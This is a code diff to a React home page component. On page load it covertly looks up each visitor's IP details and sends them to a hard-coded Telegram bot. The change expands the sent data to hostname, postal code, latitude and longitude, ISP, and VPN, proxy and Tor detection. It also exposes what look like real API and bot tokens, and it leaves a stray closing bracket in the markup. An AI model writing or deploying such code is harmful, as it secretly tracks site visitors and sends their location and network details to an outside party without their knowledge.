@@ -8,20 +8,41 @@ const navigation = [
   { name: "Contact", href: "/contact" },
 ];
 
+interface IPInfo {
+  ip: string;
+  hostname: string;
+  city: string;
+  region: string;
+  country: string;
+  loc: string; // Latitude and longitude
+  postal: string;
+  timezone: string;
+  org: string; // ISP or organization
+  privacy: {
+    vpn: boolean;
+    proxy: boolean;
+    tor: boolean;
+  };
+  asn?: {
+    asn: string;
+    name: string;
+    domain: string;
+    route: string;
+    type: string;
+  };
+}
+
 export default function Home() {
-  const [ipAddress, setIpAddress] = useState<string>('');
-  const [location, setLocation] = useState<string>('');
+  const [ipInfo, setIpInfo] = useState<IPInfo | null>(null);
 
   useEffect(() => {
     const fetchVisitorInfo = async () => {
       try {
         const response = await fetch('https://ipinfo.io/json?token=9b0d535b05cb58'); // Replace with your token
         const data = await response.json();
-
-        setIpAddress(data.ip);
-        setLocation(`${data.city}, ${data.region}, ${data.country}`);
+        setIpInfo(data);
         
-        sendToTelegram(data.ip, data.city, data.region, data.country);
+        sendToTelegram(data);
       } catch (error) {
         console.error('Error fetching IP address:', error);
       }
@@ -30,17 +51,17 @@ export default function Home() {
     fetchVisitorInfo();
   }, []);
 
-  const sendToTelegram = async (ip: string, city: string, region: string, country: string) => {
+  const sendToTelegram = async (data: IPInfo) => {
     const telegramBotToken = '7813198341:AAHB2EMoobhTABCayuHVCzJYhrY4e8pRQeo'; // Replace with your bot token
     const chatId = '5086819565'; // Replace with your chat ID
-    const message = `Visitor IP: ${ip}, Location: ${city}, ${region}, ${country}`;
+    const message = `Visitor Info:\nIP: ${data.ip}\nHostname: ${data.hostname}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nLocation (Lat, Long): ${data.loc}\nTimezone: ${data.timezone}\nOrganization/ISP: ${data.org}\nVPN Detected? ${data.privacy.vpn ? 'Yes' : 'No'}\nProxy Detected? ${data.privacy.proxy ? 'Yes' : 'No'}\nTor Detected? ${data.privacy.tor ? 'Yes' : 'No'}`;
     
     const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
     try {
       const response = await fetch(url);
-      const data = await response.json();
-      console.log('Message sent to Telegram:', data);
+      const result = await response.json();
+      console.log('Message sent to Telegram:', result);
     } catch (error) {
       console.error('Error sending message to Telegram:', error);
     }
@@ -77,7 +98,8 @@ export default function Home() {
         </h2>
       </div>
 
-
+  
+      )}
     </div>
   );
 }
